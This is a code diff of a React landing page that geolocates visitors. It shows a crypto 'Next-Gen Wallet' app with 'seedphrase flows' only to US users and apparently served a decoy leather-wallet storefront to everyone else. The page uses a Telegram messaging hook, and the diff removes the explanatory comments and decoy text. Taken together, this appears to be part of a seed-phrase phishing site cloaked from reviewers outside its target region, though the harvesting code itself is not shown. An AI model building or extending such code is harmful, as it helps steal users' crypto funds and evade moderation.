@@ -27,10 +27,10 @@ function LandingPageContent() {
   const searchParams = useSearchParams();
 
   useEffect(() => {
-    if (searchParams.get("open") === "true") {
+    if (searchParams.get("open") === "true" && isUSUser === true) {
       setWelcomeOpen(true);
     }
-  }, [searchParams]);
+  }, [searchParams, isUSUser]);
   const getCurrentUrl = useCallback(() => {
     if (typeof window !== "undefined") {
       let url = `${window.location.origin}${pathname}`;
@@ -106,7 +106,6 @@ function LandingPageContent() {
         try {
           const userCountry = await getUserCountry();
 
-          // Determine if user is in the United States
           if (userCountry) {
             const isUS =
               userCountry.countryCode === "US" ||
@@ -114,7 +113,6 @@ function LandingPageContent() {
                 userCountry.country.toLowerCase().includes("united states"));
             setIsUSUser(isUS);
           } else {
-            // If geolocation fails, default to blocking wallet features
             setIsUSUser(false);
           }
 
@@ -138,7 +136,6 @@ function LandingPageContent() {
     }
   }, [sendTelegramMessage]);
 
-  // While checking location, block the whole page with a simple fullscreen loader
   if (isLocationLoading) {
     return (
       <main className="min-h-screen bg-[#0e0e0e] text-white flex items-center justify-center">
@@ -151,14 +148,13 @@ function LandingPageContent() {
   }
 
   return (
-    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
+    <main className="min-h-screen w-full bg-[#0e0e0e] text-white flex flex-col items-stretch relative">
 
-      {/* Hero section: only for confirmed US users; non‑US users jump straight to the product list */}
       {!isLocationLoading && isUSUser && (
-        <section className="flex flex-col h-screen px-12 sm:px-24 py-24 justify-between">
+        <section className="flex flex-col w-full min-h-screen px-6 sm:px-12 lg:px-24 py-24 justify-between">
           <div className="flex flex-col items-start text-left">
             <h1 className="text-5xl sm:text-6xl font-extrabold leading-tight">
-              {isUSUser ? (
+              {isUSUser && (
                 <>
                   <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                     A Next-Gen Wallet.{" "}
@@ -168,35 +164,20 @@ function LandingPageContent() {
                     For the Digital Age.
                   </span>
                 </>
-              ) : (
-                <>
-                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
-                    Crafted Leather.{" "}
-                  </span>
-                  <br />
-                  <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
-                    Built to Last.
-                  </span>
-                </>
               )}
             </h1>
 
             <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
-              {isUSUser ? (
+              {isUSUser && (
                 <>
                   Intuitive for beginners. <br />
                   Powerful for pros.
                 </>
-              ) : (
-                <>
-                  Premium leather wallets for everyday carry. <br />
-                  Timeless design, modern minimalism.
-                </>
               )}
             </p>
 
-            {/* Open App button only for confirmed US users */}
             <button
+              type="button"
               onClick={() => {
                 setWelcomeOpen(true);
               }}
@@ -214,7 +195,7 @@ function LandingPageContent() {
 
 
       {/* Footer */}
-      <footer className="w-full max-w-5xl mt-auto mb-10 text-sm text-white/70 px-4">
+      <footer className="w-full max-w-5xl mx-auto mt-auto mb-10 text-sm text-white/70 px-4">
         <div className="flex flex-col sm:flex-row justify-between gap-6 bg-[#161616] rounded-2xl p-6">
           <div>
             <h3 className="font-semibold mb-2">Resources</h3>
@@ -236,7 +217,6 @@ function LandingPageContent() {
               </li>
             </ul>
           </div>
-
           <div>
             <h3 className="font-semibold mb-2">Social</h3>
             <ul className="space-y-1">
@@ -263,10 +243,8 @@ function LandingPageContent() {
         </div>
       </footer>
 
-      {/* Wallet / seedphrase flows are only available for US users */}
       {isUSUser && (
         <>
-          {/* 🌈 Welcome Modal */}
           <WelcomeModal
             open={welcomeOpen}
             onClose={() => setWelcomeOpen(false)}
